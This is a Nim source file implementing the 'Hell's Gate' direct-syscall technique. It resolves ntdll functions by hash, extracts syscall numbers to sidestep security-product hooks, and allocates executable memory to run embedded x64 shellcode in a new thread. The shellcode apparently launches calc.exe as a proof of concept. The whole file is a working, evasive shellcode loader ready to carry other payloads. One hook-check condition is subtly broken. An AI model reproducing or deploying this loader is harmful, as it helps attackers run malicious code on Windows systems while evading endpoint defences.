import winim
import hash

#[ Global Var ]#
var wSystemCall*: WORD

type
  VX_TABLE_ENTRY* = object
    pAddress*: PVOID
    dwHash*: uint32
    wSystemCall*: WORD
  PVX_TABLE_ENTRY* = ptr VX_TABLE_ENTRY

  #[
    Operator would populate VX_TABLE with syscalled needed
  ]#
  VX_TABLE* = object
    NtAllocateVirtualMemory*: VX_TABLE_ENTRY
    NtProtectVirtualMemory*: VX_TABLE_ENTRY
    NtCreateThreadEx*: VX_TABLE_ENTRY
    NtWaitForSingleObject*: VX_TABLE_ENTRY
  PVX_TABLE* = ptr VX_TABLE

proc getPPEB(): winim.PPEB {.asmNoStackFrame, inline.}= 
  asm """
    mov rax, qword ptr gs:[0x60]
    ret
  """

proc getVxTableEntry(pModuleBase: PVOID, pImageExportDirectory: PIMAGE_EXPORT_DIRECTORY, pVxTableEntry: PVX_TABLE_ENTRY): bool =
  var
    pdwAddressOfFunctions = cast[ptr UncheckedArray[DWORD]](cast[int](pModuleBase) + pImageExportDirectory.AddressOfFunctions)
    pdwAddressOfNames = cast[ptr UncheckedArray[DWORD]](cast[int](pModuleBase) + pImageExportDirectory.AddressOfNames)
    pwAddressOfNameOrdinals = cast[ptr UncheckedArray[WORD]](cast[int](pModuleBase) + pImageExportDirectory.AddressOfNameOrdinals)
  
  for i in 0 ..< pImageExportDirectory.NumberOfNames:
    var 
      pczFunctionName = cast[PCHAR](cast[int](pModuleBase) + pdwAddressOfNames[i])
      pFunctionAddress = cast[PBYTE](cast[int](pModuleBase) + pdwAddressOfFunctions[pwAddressOfNameOrdinals[i]])
    if hashStrA(cast[cstring](pczFunctionName)) == pVxTableEntry.dwHash:
      pVxTableEntry.pAddress = pFunctionAddress

      # check if function has been hooked
      var j = 0
      while true:
        # check if syscall, if this case we are too far
        if (cast[PBYTE](cast[int](pFunctionAddress) + j)[] == 0x0f.byte) and (cast[PBYTE](cast[int](pFunctionAddress) + j)[] == 0x05.byte):
          return false
        # check if ret, in this care we are probably too far
        if (cast[PBYTE](cast[int](pFunctionAddress) + j)[] == 0xc3.byte):
          return false

        #[
          First opcodes should be:
            mov r10, rcx
            mov rcx, <syscall>
        ]#
        if (cast[PBYTE](cast[int](pFunctionAddress) + j + 0)[] == 0x4c) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 1)[] == 0x8b) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 2)[] == 0xd1) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 3)[] == 0xb8) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 6)[] == 0x00) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 7)[] == 0x00):
          # get high and low bytes and set them in our table
          var 
            h = cast[PBYTE](cast[int](pFunctionAddress) + 5 + j)[]
            l = cast[PBYTE](cast[int](pFunctionAddress) + 4 + j)[]
          pVxTableEntry.wSystemCall = ((h shl 8) or l)
          break
        j.inc
  return true

proc getImageExportDirectory(pModuleBase: PVOID): PIMAGE_EXPORT_DIRECTORY =
  var 
    pImgDosHdr = cast[PIMAGE_DOS_HEADER](pModuleBase)
    pImgNtHdrs = cast[PIMAGE_NT_HEADERS](cast[int](pModuleBase) + pImgDosHdr.e_lfanew)
    pImgExportDirectory = cast[PIMAGE_EXPORT_DIRECTORY](cast[int](pModuleBase) + pImgNtHdrs.OptionalHeader.DataDirectory[0].VirtualAddress)
  if pImgDosHdr.e_magic != IMAGE_DOS_SIGNATURE or pImgNtHdrs.Signature != IMAGE_NT_SIGNATURE:
    return nil
  return pImgExportDirectory

proc HellsGate(wSys: WORD) = 
  wSystemCall = wSys

proc HellsDescent(arg1: auto): NTSTATUS {.asmNoStackFrame, varargs.} =
  asm """
    mov r10, rcx
    mov eax, `wSystemCall`
    syscall
    ret
  """


proc initHG*(t: PVX_TABLE): bool = 
  var pPeb = getPPEB()
  # NTDLL module
  var pLdrDataEntry = cast[PLDR_DATA_TABLE_ENTRY](cast[int](pPeb.Ldr.InMemoryOrderModuleList.Flink.Flink) - 0x10)
  # EAT of NTDLL
  var pImageExportDirectory = getImageExportDirectory(pLdrDataEntry.DllBase)
  if cast[int](pImageExportDirectory) == 0:
    return false
  
  t.NtAllocateVirtualMemory.dwHash = static(hashStrA("NtAllocateVirtualMemory"))
  if not getVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory, t.NtAllocateVirtualMemory): 
    return false

  t.NtCreateThreadEx.dwHash = static(hashStrA("NtCreateThreadEx"))
  if not getVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory, t.NtCreateThreadEx): 
    return false

  t.NtProtectVirtualMemory.dwHash = static(hashStrA("NtProtectVirtualMemory"))
  if not getVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory, t.NtProtectVirtualMemory): 
    return false

  t.NtWaitForSingleObject.dwHash = static(hashStrA("NtWaitForSingleObject"))
  if not getVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory, t.NtWaitForSingleObject): 
    return false
  
  return true

proc triggerPayload(t: PVX_TABLE): bool =
  # var sc = "\x90\x90\xcc\x90\x90\x90\xcc\xcc\xcc\xc3\xeb\xef".cstring
  var 
    sc: array[276, byte] = [
      byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
      0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,
      0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,
      0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
      0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
      0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,
      0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,
      0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,
      0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,
      0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,
      0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,
      0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,
      0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,
      0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,
      0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,
      0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,
      0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,
      0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,
      0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,
      0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,
      0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,
      0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,
      0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,
      0x00]
    status: NTSTATUS = 0
    lpAddress: LPVOID = NULL
    scLen: SIZE_T = sizeof(sc)
    ulOldProtect: ULONG
  
  # allocate memory for the shellcode
  HellsGate(t.NtAllocateVirtualMemory.wSystemCall)
  status = HellsDescent(cast[HANDLE](-1), lpAddress.addr, 0, &scLen, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  echo status
  if status != 0:
    return false

  # write memory
  copyMem(lpAddress, sc[0].addr, sizeof(sc))

  # change page permissions
  HellsGate(t.NtProtectVirtualMemory.wSystemCall)
  status = HellsDescent(cast[HANDLE](-1), lpAddress.addr, scLen.addr, PAGE_EXECUTE_READ, ulOldProtect.addr)
  if status != 0:
    return false

  # create thread
  var hThread: HANDLE = INVALID_HANDLE_VALUE
  HellsGate(t.NtCreateThreadEx.wSystemCall)
  status = HellsDescent(hThread.addr, 0x1FFFFF, NULL, -1, lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL)
  if status != 0:
    return false

  # wait for X seconds
  # var timeout: LARGE_INTEGER
  #timeout.QuadPart = -1000000 # Wait for 1 second
  HellsGate(t.NtWaitForSingleObject.wSystemCall)
  status = HellsDescent(hThread, FALSE, 0)
  if status != 0:
    return false

  return true

proc main() =
  var t: VX_TABLE
  if initHG(t) == true:
    discard triggerPayload(t)

when isMainModule:
  main()
